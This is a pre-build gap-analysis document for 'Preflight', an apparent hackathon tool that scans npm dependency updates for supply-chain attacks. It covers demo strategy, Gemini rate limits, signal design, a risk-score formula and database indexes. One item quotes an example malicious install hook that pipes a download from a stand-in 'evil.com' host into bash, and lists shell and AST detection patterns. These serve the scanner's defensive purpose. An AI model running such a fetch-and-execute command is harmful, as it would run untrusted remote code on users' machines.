# Preflight — Gap Analysis & Known Risks
*Generated: May 8, 2026 · Devil's advocate session pre-build*

Append this section to `<repo-root>/CLAUDE.md`. Every item here is a known gap that must be resolved during the build — not discovered during the demo.

---

## CRITICAL — Demo-breaking if not fixed before writing code

### 1. Demo architecture: Verdaccio cannot work from Render
The demo on `preflight.dev` calls the API on Render. Verdaccio runs locally. Render cannot reach localhost.
**Decision (locked):** Demo runs in `demo_mode`. The axios 1.7.9 → 1.7.10 scan is pre-seeded in MongoDB at startup. The `/demo` endpoint (or a `?demo=true` flag on `POST /analyze`) returns the cached BLOCK result with pre-computed signals. Signals still animate in sequentially in the UI — the timing is real, the result is cached. Gemini is NOT called during the live demo.

### 2. Render cold start kills the first demo request
Free tier spins down after 15 min idle. Cold start = 30–60s hang.
**Fix:** Add a keep-alive cron job as the very first thing after deploying to Render. Ping `GET /health` every 14 minutes. Use Render's built-in cron or an external service like cron-job.org.

### 3. Gemini rate limits on free tier
Gemini 2.5 Pro: 2 RPM, 50 requests/day. Gemini 2.5 Flash: 15 RPM, 1M tokens/day.
50 demo runs (testing + judges + live) will exhaust the Pro daily quota.
**Fix:** Pre-seed demo scan (see #1). For real scans, use Flash by default and Pro only for BLOCK confirmation. Keep separate API keys for dev/staging/prod to split quota.

### 4. SHA pinning contradiction — critical credibility hole
The spec says "SHA pinning" but the YAML shows `uses: preflight-ai/preflight@v1`. A mutable tag means the action itself is a supply chain attack vector — ironic for a supply chain security tool.
**Fix:** Every public YAML snippet (README, landing page, pitch deck, action.yml docs) must show an immutable reference. Use `@v1.0.0` (immutable tag) at minimum, or a full SHA pin. Document this explicitly.

---

## HIGH — Correctness issues that affect real analysis

### 5. Signal 3: "signing key fingerprint" doesn't exist in the npm API
npm in 2026 uses Sigstore provenance attestation, not per-publisher signing keys. The `registry.npmjs.org/{package}` API has no `signing_key_fingerprint` field.
**Fix:** Reframe the signal as: "package version published WITHOUT provenance attestation when all prior versions had it." Check `dist.signatures` and `_attestations` fields. If provenance is absent on new version but present on old → flag CRITICAL. This is more accurate and still catches the axios attack vector.

### 6. Signal 2: acorn cannot parse shell scripts
Most postinstall hooks are shell commands (`curl https://evil.com | bash`), not JS. Acorn is a JS parser and will error or return nothing useful on shell.
**Fix:** Add a regex-based shell pattern scanner BEFORE the acorn path:
- Patterns: `curl`, `wget`, `bash -c`, `sh -c`, pipe to shell, `base64 -d`, `eval $(...)`, encoded payloads
- Run shell scanner first; only run acorn if the hook value looks like a JS file path (`node ./...`) or inline JS

### 7. Signal 2: acorn needs to follow file paths into the tarball
If `postinstall` is `"node ./scripts/setup.js"`, acorn must parse `scripts/setup.js` from inside the tarball — not the hook string itself. This is unspecified in the service design.
**Fix:** In `ast_scanner.py`, after extracting the hook string: if string matches `node <path>`, extract that file from the tarball and parse it. If string is an inline JS expression, parse directly.

### 8. Signal 2: false positives on `require('https')` and `require(variable)`
Hundreds of legitimate packages (electron, puppeteer, playwright, node-pre-gyp) make HTTP calls in postinstall. These will be flagged HIGH and pollute community scores.
**Fix:** Narrow the dangerous AST patterns to combinations that are genuinely rare in legitimate code:
- `eval()` with a non-literal argument
- `new Function(string_variable)`
- `Buffer.from(string > 30 chars, 'base64')` — the string itself, not a variable
- `exec`/`execSync`/`spawnSync` with a variable argument (not a hardcoded string)
- `require('https')` + `process.spawn` in the SAME script → flag only the combination, not standalone

### 9. Signal 3: `risk_score` formula is undefined
The spec outputs `{ risk_score: 92 }` but never defines how individual flags combine into 0–100.
**Defined formula:**
```
score = 0
+ key/provenance anomaly:     +50
+ inactive_days > 180:        +35
+ inactive_days 90–180:       +25
+ new_maintainer_added:       +20 (weighted down if downloads > 1M and package_age > 365 days)
+ package_age < 30 days with weekly_downloads > 10000: +15
cap at 100
```

### 10. Signal 4: Gemini prompt is undefined
The entire quality of AI reasoning depends on a prompt that doesn't exist in the spec. A naive prompt produces inconsistent outputs.
**Required prompt structure:**
- Persona: "You are a senior supply chain security researcher..."
- Input: structured JSON of all 3 signal outputs
- Output: strict JSON schema `{ verdict, confidence, summary (max 2 sentences), attack_pattern }`
- Few-shot examples: one BLOCK example, one WARN, one PASS
- Hard constraint: respond ONLY with the JSON object, no preamble

### 11. Gemini fail-safe is undefined
"Gemini unreachable → rule-based fallback" is in the spec but the rules aren't written.
**Defined fail-safe:**
```python
flagged_count = sum([script_diff.flagged, ast_scan.flagged, maintainer.flagged])
if flagged_count >= 3: verdict = "BLOCK", confidence = 0.90
elif flagged_count == 2: verdict = "WARN", confidence = 0.65
elif flagged_count == 1: verdict = "WARN", confidence = 0.40
else: verdict = "PASS", confidence = 0.95
```

### 12. Gemini Pro for BLOCK is slowest on highest-stakes verdict
**Fix:** Always use Flash first. If Flash returns BLOCK with confidence >= 0.85, run a parallel Pro confirmation. If both return BLOCK → post as BLOCK. If they disagree → take the more conservative verdict. Never block the PR comment on Pro alone.

---

## MEDIUM — Quality and edge cases

### 13. New package (no old version) edge case
When a PR introduces a brand-new dependency, `old_version` is null. Signal 1 diff logic collapses with nothing to compare against.
**Fix:** When `old_version` is null, skip Signal 1 diff and instead: any postinstall hook present on a new package → automatically flag Signal 1 as HIGH. Flag in Gemini context: "This is a new dependency with no prior version history."

### 14. Multi-package PRs hit rate limits
A PR bumping 5 packages triggers 5 parallel `POST /analyze` calls → 5 Gemini calls simultaneously → rate limit.
**Fix:** Process packages sequentially in the action, not in parallel. Add a 1-second delay between calls. Cap at 3 packages per run in v1 — if a PR changes more than 3 packages, post a summary comment: "Preflight analyzed the 3 highest-risk changes (by download count). Run full scan via CLI for remaining packages."

### 15. Demo runs pollute community threat scores
40 demo runs of axios 1.7.9 → 1.7.10 → axios gets a community_threat_score of 100 from fake data.
**Fix:** Add `is_demo: boolean` field to the scans collection. Exclude `is_demo: true` scans from community_threat_score calculations. The demo endpoint always sets `is_demo: true`.

### 16. `GET /packages/:name/threat` undefined for < 5 scans
Spec says score "isn't shown publicly" but doesn't define the API response.
**Fix:** Return HTTP 200 with `{ package_name, total_scans, score: null, reason: "insufficient_data", minimum_scans: 5 }`. Never return 404 — the package exists, just has no score yet.

### 17. GITHUB_TOKEN permissions block missing from action.yml
Restrictive default repo permissions will cause the action to fail silently.
**Required permissions block in action.yml:**
```yaml
permissions:
  pull-requests: write   # post PR comment
  statuses: write        # set commit status check
  contents: read         # read package-lock.json
```

### 18. Missing compound index: package_name + verdict
Common query: "all BLOCK verdicts for package X" — currently requires full collection scan.
**Add to MongoDB index spec:** `{ package_name: 1, verdict: 1 }` compound index on scans collection.

### 19. No TTL on scans collection
Atlas free tier = 512MB. Hackathon run with continuous demo could fill it.
**Fix:** Add TTL index: `{ scanned_at: 1 }` with `expireAfterSeconds: 2592000` (30 days).

### 20. safe_versions[] cap of 20 has undefined eviction strategy
**Fix:** Maintain as a sorted array (newest first). When cap is reached, drop the oldest version string (index 19). Implemented as a MongoDB `$push` with `$slice: -20` (keep last 20).

---

## Pitch-level concerns (pre-presentation)

### P1. Source the "npm audit/Snyk/Dependabot missed it" claim
This is the core factual claim of the pitch. Find a primary source (npm security advisory, post-mortem blog post, CVE record, or news article) before presenting. If no source exists, rephrase to: "Tools like npm audit and Dependabot are reactive — they require a CVE. The axios attack had no CVE because the package was legitimately signed and the maintainer account was compromised."

### P2. Socket.dev differentiation
Socket.dev does behavioral npm analysis and has a GitHub App. The differentiation talking points:
- Preflight is **open source + MIT** (Socket is proprietary SaaS)
- Preflight requires **zero account, zero signup, zero dashboard access**
- Preflight is **one line of YAML** with no app installation or org-level permissions
- Preflight is **free forever** with no usage limits

### P3. "Gets smarter" language
Replace "gets smarter with every scan" with "aggregates community threat signal — every scan contributes to a shared intelligence layer." The former implies ML; the latter is accurate.

---

## Build order additions (prepend to Hours 0–8)

Before scaffolding anything:
1. Decide and document demo_mode strategy (pre-seeded MongoDB scan)
2. Write the Gemini prompt in a separate `prompts/analyze.txt` file — treat it as a first-class artifact
3. Define the shell pattern list for Signal 2 (regex patterns file)
4. Lock the risk_score formula in a constants file

---

*This file is a living document. Add "# RESOLVED: [item number]" comments as gaps are closed during the build.*
